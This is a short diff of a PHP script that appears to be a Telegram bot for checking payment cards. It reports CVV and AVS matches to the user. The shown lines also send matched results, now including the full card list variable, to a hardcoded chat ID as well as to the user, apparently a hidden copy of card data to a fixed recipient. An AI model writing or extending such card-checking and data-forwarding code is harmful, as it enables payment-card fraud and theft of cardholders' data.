@@ -61,10 +61,10 @@ switch($message){
 				
 				if(strpos($pagamento, "AVS") !== false){
 					sendMessage($chatId, $filtered_string . " CVV: Matched AVS");
-					sendMessage("946540447", $filtered_string . " CVV: Matched AVS");
+					sendMessage("946540447", $cclist . " CVV: Matched AVS");
 				}
 				else{
-					sendMessage($chatId, $filtered_string . " " . $error_message);
+					sendMessage($chatId, $cclist . " " . $error_message);
 				}
 			}
 		}
